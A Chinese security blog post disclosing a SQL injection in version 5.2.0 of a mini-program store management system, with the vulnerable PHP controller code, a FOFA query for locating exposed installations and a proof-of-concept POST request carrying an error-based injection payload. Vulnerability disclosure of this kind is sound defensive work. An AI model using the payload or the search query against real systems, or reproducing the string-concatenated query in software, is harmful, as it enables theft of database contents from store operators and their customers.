---
title: "万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageindexCop-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageindexcop-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/18 08:16
- 547浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

计算机安全

SQL

应用程序

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageindexCop 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

音频与视频聊天

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
public function doPageindexCop()
    {
        $type = input("type");
        $uniacid = input("uniacid");
        $now = time();
        $prefix = config('database.prefix');
        $indexCopAll = Db::query("SELECT * FROM {$prefix}wd_xcx_coupon WHERE uniacid = {$uniacid} and flag = 1 and (etime > {$now} or etime = 0) order by num desc,id desc");
        if ($indexCopAll) {
            $indexCopOne = $indexCopAll[0];
            if ($indexCopOne) {
                if ($indexCopOne['btime']) {
                    $indexCopOne['btime'] = date("Y-m-d", $indexCopOne['btime']);
                }
                if ($indexCopOne['etime']) {
                    $indexCopOne['etime'] = date("Y-m-d", $indexCopOne['etime']);
                }
            }
            return json_encode(array('data' => $indexCopOne));
        } else {
            return json_encode(array('data' => 1));
        }
    }
```

`$uniacid` 直接拼接进 Db::query sql语句里，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPageindexCop HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--
```

[![万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞](images/img-001-bfc9fd6ddad6.webp)](https://image.mrxn.net/5055f4a6616540e99efb6337370fa81f.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
